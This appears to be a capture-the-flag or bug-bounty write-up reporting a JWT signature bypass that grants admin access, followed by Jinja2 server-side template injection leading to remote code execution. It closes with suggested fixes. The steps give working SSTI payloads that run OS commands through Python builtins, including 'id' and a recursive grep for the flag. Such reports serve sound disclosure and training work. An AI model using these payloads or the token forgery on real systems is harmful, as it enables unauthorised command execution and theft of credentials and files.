# Title: SSTI to RCE in Admin Panel via JWT Authentication Bypass

## Summary
I discovered a Server-Side Template Injection (SSTI) vulnerability in the admin panel that allows remote code execution. The vulnerability is accessible after bypassing JWT authentication by modifying the token payload.

## Steps to Reproduce

1. **JWT Bypass**
   - Intercept the request and modify the JWT token
   - Change `id` to `1` and `role` to `admin`
   - The server accepts the modified token without signature verification

2. **Access Admin Panel**
   - Navigate to the admin profile section
   - Observe the display name field is vulnerable to SSTI

3. **SSTI Exploitation**
   - Use payload: `{{7*7}}` â†’ returns `49` (confirms Jinja2)
   - Use payload: `{{ self.__init__.__globals__['__builtins__']['__import__']('os').popen('id').read() }}`
   - Execute arbitrary commands to read files or system information

4. **Proof of Concept**
   - Payload used to find flag: `{{ self.__init__.__globals__['__builtins__']['__import__']('os').popen('grep -r "INTIGRITI{" .').read() }}`

## Impact
- Full remote code execution on the server
- Ability to read sensitive files, database credentials, and system information
- Complete server compromise

## Suggested Fix
- Validate JWT token signatures properly
- Implement proper input sanitization for template rendering
- Use context-aware escaping for user inputs in templates
- Restrict template engine capabilities in production